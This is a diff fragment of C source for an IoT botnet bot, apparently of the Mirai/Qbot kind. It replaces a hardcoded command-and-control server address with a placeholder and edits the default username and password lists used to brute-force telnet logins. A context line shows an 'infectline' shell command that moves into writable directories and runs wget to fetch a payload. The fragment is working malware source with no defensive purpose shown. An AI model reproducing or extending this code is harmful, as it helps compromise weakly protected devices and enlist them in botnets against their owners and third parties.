@@ -38,7 +38,7 @@ char *infectline = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 
 
 unsigned char *commServer[] =
 {
-        "5.206.225.136:23"
+        "ip1:port1"
 };
 
 int initConnection();
@@ -55,9 +55,8 @@ uint32_t scanPid;
 uint64_t numpids = 0;
 struct in_addr ourIP;
 unsigned char macAddress[6] = {0};
-char *usernames[] = {"root\0", "admin\0", "user\0", "login\0", "guest\0", "support\0"};
-char *passwords[] = {"root\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "\0", "password\0", "support\0"};
-
+char *usernames[] = {"root\0", "admin\0", "user\0", "sysadm\0", "guest\0", "tech\0"};
+char *passwords[] = {"root\0", "toor\0", "admin\0", "user\0", "guest\0", "pass\0","1234\0", "12345\0", "123456\0", "tech\0", "password\0"};
 #define PHI 0x9e3779b9
 static uint32_t Q[4096], c = 362436;
 
